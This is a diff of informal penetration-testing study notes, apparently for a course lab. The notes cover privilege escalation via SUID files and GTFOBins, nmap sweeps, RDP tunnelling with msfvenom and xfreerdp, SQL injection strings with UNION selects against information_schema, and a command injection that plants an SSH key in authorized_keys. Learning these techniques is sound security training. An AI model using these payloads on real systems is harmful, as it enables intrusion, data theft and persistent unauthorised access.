@@ -56,7 +56,7 @@ find / -type f -perm (that command, its in student guide and go to GTFO bins)
 even do sudo -l and see what you find
 abuse it with GTFO BINS
 exploit  the other box found on the first box, which you would find with ping sweeping the network, with nmap.
-now make a tunnel to vulnerable port , banner grab the ports nc ip port
+now make a tunnel to vulnerable rdp port , banner grab the ports nc ip port
 once you hit that windows, use the msfvenom commands with multi handler
 then use xfreerdp on it
 xfreerdp /u:user p:/password /dynamic-resolution +clipboard /v:127.0.0.1:port made for rdp tunnel
@@ -74,6 +74,9 @@ could banner grab it as well
 
 even look at the windows defender
 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+*******************************************************************PRACTICE*******************************************************************
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 Cars we sell POST method
 Ford' or 1 = '1
 Honda' or 1 = '1
@@ -88,14 +91,17 @@ Audi' Union select 1,2,3,4,5 # works, but it doesn't display 2. 2 is just filler
 Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
 
 Exploit Development (The gdb stuff)
+https://github.com/jacksonwilkie/Security/blob/main/Exploit%20Development
 
+CMD Injection for your own password
 ssh-keygen -t rsa -b 4096
+cmd injection::::: mkdir /.ssh
 ;echo "(paste publickey)" > /var/www/.ssh/authorized_keys
 ;cat /var/www/.ssh/authorized_keys
 
-ssh -i id_ ( idk look in student guide
+one > will create a file, two >> will append to a file
 
-https://github.com/jacksonwilkie/Security/blob/main/Exploit%20Development
+ssh -i id_ ( idk look in student guide ezpz)
 
 \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 --------------------------------------------------------------RECAP---------------------------------------------------------------------------------------
@@ -104,8 +110,8 @@ Every linux box: /etc/passwd, /etc/hosts, cat out user directories, /etc/crontab
                                                                             
                                                                     port 22 open
           _---------------------------------------------------------->192.168.28.172
-Lin OPS -/-> user2 /---------------------------->192.168.28.181
-          nmap http-enum scan                    ports 80 and 22 open
+Lin OPS -/-> user2 /---------------------------->192.168.28.181 ----------------------------------------------------------->Windows ip
+          nmap http-enum scan                    ports 80 and 22 open                                                          Made tunnel to RDP Port and then ran an xfreerdp on it
           cat /etc/hosts                         http-enum scan, scanning new network
           Master Socket made                     SQL 
           nmap found ports 22 and 80                
